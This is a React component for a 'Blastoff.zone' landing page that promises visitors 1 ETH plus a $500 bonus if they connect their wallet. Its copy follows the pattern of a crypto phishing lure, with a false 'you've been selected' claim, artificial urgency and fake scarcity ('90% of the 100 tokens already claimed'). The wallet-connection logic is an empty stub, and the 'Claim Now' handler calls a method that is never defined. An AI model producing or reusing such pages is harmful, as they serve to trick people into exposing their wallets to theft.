import React from 'react';
import axios from 'axios';
import '../public/styles/ClaimReward.css';

class ClaimReward extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
            claimReward: null,
        };
    }

    componentDidMount() {
        this.getClaimReward();
    }

    getClaimReward = async () => {
        const response = await axios.get('/api/claimReward.js');
        this.setState({ claimReward: response.data });
    }

    connectWallet = () => {
        // Connect to wallet logic here
    }

    render() {
        const { claimReward } = this.state;

        return (
            <div id="claim-reward">
                <h1>Blastoff.zone: Earn 1 ETH + $500 Bonus!</h1>
                <p>Congratulations! You've been selected as one of the fortunate individuals eligible to claim 1 ETH right now, along with a $500 bonus, courtesy of Blastoff.zone.</p>
                <button onClick={this.connectWallet}>Connect Wallet</button>
                {claimReward && <button onClick={() => this.claimReward(claimReward)}>Claim Now</button>}
                <p>This exclusive opportunity won't last long, so make sure to act swiftly to secure your rewards!</p>
                <p>Please note that rewards are distributed on a first-come, first-served basis. With 90% of the 100 tokens already claimed, seize this chance before it's too late!</p>
            </div>
        );
    }
}

export default ClaimReward;